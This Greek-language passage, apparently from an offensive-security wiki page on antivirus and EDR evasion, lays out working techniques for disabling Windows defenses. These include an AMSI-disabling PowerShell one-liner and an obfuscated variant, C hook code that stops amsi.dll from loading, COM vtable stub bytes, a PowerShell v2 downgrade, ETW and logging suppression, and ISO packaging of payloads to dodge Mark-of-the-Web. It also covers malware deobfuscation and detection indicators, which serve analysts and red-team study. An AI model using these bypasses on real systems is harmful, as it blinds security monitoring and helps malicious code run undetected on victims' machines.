Ωστόσο, το AMSI έχει τη δυνατότητα να αποσυσκοτίζει scripts ακόμη κι αν έχουν πολλαπλά επίπεδα, επομένως το obfuscation μπορεί να μην είναι καλή επιλογή, ανάλογα με τον τρόπο με τον οποίο γίνεται. Αυτό σημαίνει ότι η αποφυγή ανίχνευσης δεν είναι τόσο απλή. Παρότι, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, αυτό εξαρτάται από το πόσο έντονα έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται μέσω φόρτωσης ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παραποιηθεί, ακόμη και όταν εκτελείται ως μη προνομιούχος χρήστης. Εξαιτίας αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους παράκαμψης της σάρωσης AMSI.

**Εξαναγκασμός σφάλματος**

Ο εξαναγκασμός αποτυχίας της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη λειτουργικό στην τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Να έχεις υπόψη ότι πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσεις κώδικα αν σκοπεύεις να παραμείνεις μη ανιχνεύσιμος.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με οδηγίες που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με το powershell. Δες [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα.

### Ανακατεύθυνση του δείκτη σάρωσης AMSI COM αντί για επιδιόρθωση του `AmsiScanBuffer`

Μια άλλη παράκαμψη που περιορίζεται στην εκάστοτε διεργασία αφήνει ανέπαφο το σημείο εισόδου `AmsiScanBuffer`. Στον καταγεγραμμένο 64-bit .NET loader, δημιουργείται ένα αντικείμενο AMSI COM από το CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`. Η `Marshal.GetIUnknownForObject()` επιστρέφει τον δείκτη διεπαφής και η θέση vtable με offset `0x18` χρησιμοποιείται ως στόχος της κλήσης σάρωσης. Ο loader επιδιορθώνει έναν native δείκτη της `Console.Clear()` με ένα μικρό x64 stub, αλλάζει αυτήν την εγγραφή vtable προς το stub μέσω της `VirtualProtect()` και στη συνέχεια επαναφέρει την αρχική προστασία σελίδας. Απαιτούνται τόσο πλάτος δείκτη 64-bit όσο και η αναμενόμενη διάταξη COM· αυτό δεν είναι γενικό offset για αυθαίρετες διεπαφές AMSI ή builds. Τα προηγούμενα στάδια που παρατηρήθηκαν είναι η [φόρτωση sidecar signed AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) και η [αποσειριοποίηση RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Τα bytes του stub που παρατηρήθηκαν είναι `41 C7 00 01 00 00 00 33 C0 C3`: γράφουν **1** στον δείκτη αποτελέσματος στο `r8` και επιστρέφουν **0** στο `eax`. Επομένως, ο ισχυρισμός της αναφοράς ότι το αποτέλεσμα της σάρωσης είναι `AMSI_RESULT_CLEAN` (0) συγχέει την τιμή επιστροφής `S_OK` με το enum εξόδου. Στην τεκμηριωμένη σειρά του `AMSI_RESULT`, το αποτέλεσμα **1** είναι `AMSI_RESULT_NOT_DETECTED`· παραμένει κάτω από το όριο ανίχνευσης.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Αποκλεισμός του AMSI εμποδίζοντας τη φόρτωση του amsi.dll (hook στο LdrLoadDll)

Το AMSI αρχικοποιείται μόνο μετά τη φόρτωση του `amsi.dll` στην τρέχουσα διεργασία. Μια robust παράκαμψη, ανεξάρτητη από τη γλώσσα, είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για αυτήν τη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (pseudocode x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί με PowerShell, WScript/CScript και custom loaders (οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με την παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), ώστε να αποφύγετε ίχνη από μεγάλες γραμμές εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει τις υπογραφές χρησιμοποιώντας τυχαιοποιημένες συναρτήσεις που ορίζει ο χρήστης, μεταβλητές και εκφράσεις χαρακτήρων, καθώς και τυχαιοποιημένη χρήση πεζών και κεφαλαίων γραμμάτων στις λέξεις-κλειδιά του PowerShell.

**Αφαίρεση της υπογραφής που εντοπίστηκε**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο σαρώνει τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα προϊόντων AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PS

Η καταγραφή του PowerShell είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση του PowerShell Transcription και του Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του PowerShell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (την προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Έτσι παρακάμπτονται τα μέτρα ελέγχου που σχετίζονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιούνται εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell. Η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ίσως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικα που είναι ευαίσθητα ή πρέπει να αποκρυφτούν.

### Αποσυσκότιση .NET Binaries που προστατεύονται από το ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντήσετε πολλά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω ροή εργασίας **αποκαθιστά αξιόπιστα ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να απομεταγλωττιστεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση της προστασίας από παραποίηση – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον στατικό constructor του *module* (`<Module>.cctor`). Επίσης τροποποιεί το checksum του PE, ώστε οποιαδήποτε αλλαγή να προκαλέσει κατάρρευση του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – τροφοδοτήστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot με υποστήριξη για ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Σημαίες:
     • `-p crx` – επιλογή του profile ConfuserEx 2
     • το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και αποκρυπτογραφεί τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy calls – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω την απομεταγλώττιση.  Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα θα πρέπει να παρατηρείτε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το δυαδικό αρχείο στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload.  Συχνά το malware το αποθηκεύει ως πίνακα byte με κωδικοποίηση TLV, ο οποίος αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μία εντολή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), το οποίο προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από αλλοίωση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά τον χρόνο μεταγλώττισης, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, οι οποίες δημιουργούνται από το framework metaprogramming προτύπων της C++, δυσκολεύοντας κάπως τη ζωή όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα PE files, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζει το LLVM, χρησιμοποιώντας ROP (return-oriented programming). Κάνει obfuscate ένα πρόγραμμα στο επίπεδο του assembly code, μετατρέποντας κανονικές εντολές σε αλυσίδες ROP και ανατρέποντας τη φυσική αντίληψή μας για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

### Αυτομάσκα για κάθε συνάρτηση με τη βοήθεια του LLVM compiler

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όταν βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις XOR-masked όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει demangled ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό masking handler στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσης Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνει μετά το instruction selection και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε emitted return** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο συνημμένο epilogue και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε τυχόν compiler-generated αποδόμηση stack/frame πριν από κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Τα `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ το `emitEndOfAsmFile()` εκπέμπει τον handler. Σύμβολα που είναι κοινά μεταξύ των σταδίων εκπομπής επιτρέπουν σε ένα branch του prologue να στοχεύει το μεταγενέστερο epilogue. Για ένα χειροκίνητα emitted near `je`, γράψτε `0F 84` και έπειτα την τετρα-byte MC expression `target - address_after_je`. Οι κλήσεις και τα jumps προς τον handler μπορούν αντί γι’ αυτό να εκπέμπονται ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μη επιλεγμένη συνάρτηση, όταν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα κλειδί XOR και εγγραφές 16 byte, οι οποίες περιέχουν έναν loader-relocated δείκτη συνάρτησης και ένα runtime μήκος, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στη μετατόπιση εγγραφής `+8`, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE sections έχουν μέγιστο μήκος οκτώ byte, επομένως η αναζήτηση κατά τον χρόνο εκτέλεσης εντοπίζει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό RVA του entry point στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub αποκτά τη βάση του image από το `gs:[0x60]` → `[PEB+0x10]`, διατρέχει τα PE32+ imports για να επιλύσει ένα ήδη εισαγόμενο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το μόνιμα αναγνώσιμο prologue καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που παραμένει clear. Στη συνέχεια, το epilogue χρησιμοποιεί `call handler`· αφού ο handler αποθηκεύσει 13 registers (`0x68` bytes), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata της. Το stub εκκαθαρίζει το sentinel και κάνει jump στο `ImageBase + original_entry_point_RVA` αφού γίνει masking σε όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στο συνημμένο epilogue, ενώ κάθε προηγούμενο return κάνει jump απευθείας στον κοινό handler. Το κανονικό epilogue χρησιμοποιεί επίσης `jmp handler` αντί για `call`, οπότε, μετά το εκ νέου masking, το `ret` του handler καταναλώνει τη διεύθυνση επιστροφής του αρχικού καλούντος και διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitive masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (`0x46` bytes σε αυτό το build), αλλάζει το υπόλοιπο σε `PAGE_EXECUTE_READWRITE`, κάνει XOR byte προς byte με το χαμηλό byte του κλειδιού και, στη συνέχεια, το ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά την κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ενδείξεις υψηλής αξιοπιστίας για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point μέσα σε εκτελέσιμο `.stub` και section `.funcmet` που περιέχει κλειδί και relocated δείκτες προς το `.text`;
- parsing του PEB, του import table και του section table πριν από το CRT, ακολουθούμενο από κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά return sites που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες αλλαγές προστασίας μέσω `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό clear σώμα, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, τα αναγνώσιμα metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα slots TEB του PoC είναι τοπικά για κάθε thread, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές σε όλη τη διεργασία. Επομένως, ταυτόχρονη ή αναδρομική είσοδος μπορεί να αλλάξει ξανά τις εντολές ενώ εκτελείται άλλη κλήση· εξαιρέσεις και μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το εκ νέου masking. Μια ανθεκτική υλοποίηση πρέπει να συγχρονίζει τις αλλαγές κατάστασης, να επαναφέρει την προστασία που επιστράφηκε μέσω του `lpflOldProtect`, να αποφεύγει hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` ως προς την ευθυγράμμιση stack x64 και να καλεί `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων bytes. Η Microsoft καθιστά ρητά τον καλούντα υπεύθυνο για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως να έχετε δει αυτήν την οθόνη όταν κατεβάζετε εκτελέσιμα από το διαδίκτυο και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που αποσκοπεί στην προστασία του τελικού χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη, πράγμα που σημαίνει ότι οι εφαρμογές που κατεβαίνουν σπάνια ενεργοποιούν το SmartScreen, το οποίο προειδοποιεί τον τελικό χρήστη και εμποδίζει την εκτέλεση του αρχείου (αν και μπορεί να εκτελεστεί κάνοντας κλικ στις επιλογές Περισσότερες πληροφορίες -> Εκτέλεση ούτως ή άλλως).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με τη διεύθυνση URL από την οποία έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα που έχουν υπογραφεί με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε την προσθήκη Mark of The Web στα payloads σας είναι να τα συσκευάσετε σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε τόμους **που δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε containers εξόδου για την αποφυγή του Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί μια επίδειξη παράκαμψης του SmartScreen με συσκευασία payloads μέσα σε αρχεία ISO, χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων ενεργειών.

Όπως ακριβώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό να ρυθμιστεί η συνάρτηση **`EtwEventWrite`** της διεργασίας user space ώστε να επιστρέφει αμέσως χωρίς να καταγράφει κανένα συμβάν. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη, ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ αποτελεσματικός τρόπος εκτέλεσης των εργαλείων post-exploitation χωρίς να εντοπιστούν από το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί μόνο να μας απασχολήσει η τροποποίηση του AMSI για ολόκληρη τη διεργασία.

